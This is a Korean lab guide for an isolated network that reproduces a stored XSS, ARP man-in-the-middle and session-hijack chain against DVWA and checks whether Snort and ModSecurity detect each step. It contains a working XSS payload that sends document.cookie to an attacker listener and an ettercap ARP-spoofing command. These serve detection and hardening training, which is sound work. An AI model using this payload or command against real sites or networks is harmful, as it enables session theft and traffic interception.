# 5단계 — 공격 재현 및 탐지 검증

격리망에서 공격을 재현하되, **목표는 각 단계가 Snort/ModSecurity에 잡히는지
확인**하는 것입니다. 방어를 껐을 때와 켰을 때를 비교합니다.

## STEP 1 — Stored XSS 주입

공격자가 DVWA Guestbook 입력 폼에 스크립트를 저장합니다(교재적 예제 페이로드).

```html
<script>new Image().src='http://192.168.10.5:8000/log?c='+document.cookie</script>
```

- **방어 OFF:** DB에 그대로 저장됨.
- **방어 ON 검증:** 게이트웨이를 거치므로 ModSecurity CRS 941xxx가 요청을
  **403 Forbidden**으로 차단. `/var/log/modsec_audit.log`에 룰 ID가 남는지 확인.

## STEP 2 — 쿠키 유출 (XSS 실행)

피해자(관리자)가 Guestbook을 열면 저장된 스크립트가 실행되어 쿠키가
공격자 C2(`http.server 8000`)로 전송됩니다.

- **탐지 확인:** Snort 룰 ①(`sid:1000001`, document.cookie)과 C2 전송 룰이 경보를 올리는지.
- **하드닝 검증:** HttpOnly 적용 후에는 `document.cookie`가 빈 값이라 C2 로그에
  PHPSESSID가 찍히지 않음.

## STEP 3 — ARP MitM 및 세션 분석

공격자가 Ettercap으로 피해자↔게이트웨이 사이를 ARP 스푸핑해 중간자 위치를 잡고,
Wireshark로 세션 패킷과 TCP SEQ/ACK를 관찰합니다.

```bash
# Kali — 격리망 전용
sudo ettercap -T -i eth0 -M arp:remote \
  /192.168.10.30// /192.168.10.10//
```

- **탐지 확인:** ARP 테이블 변조·중복 MAC, 비정상 RST 폭주(Snort 룰 ② `sid:1000002`).

## STEP 4 — 세션 재사용(권한 도용)

탈취한 PHPSESSID를 공격자 브라우저에 주입해 관리자로 재접속을 시도합니다
(세션 하이재킹의 결과 확인).

- **방어 OFF:** 세션 재사용 성공 → 관리자 권한 획득.
- **방어 ON 검증:** HttpOnly로 쿠키 자체가 유출되지 않아 → 탈취할 세션이 없음.
  SameSite와 결합하면 재사용도 제한.

> 핵심 — 쿠키 재사용만으로도 세션 탈취는 성립합니다. TCP RST 주입(STEP 3)은
> 비연결 세션을 가로채는 별도 시나리오로, 두 가지를 분리해 재현하면 방어 지표가
> 더 명확해집니다.
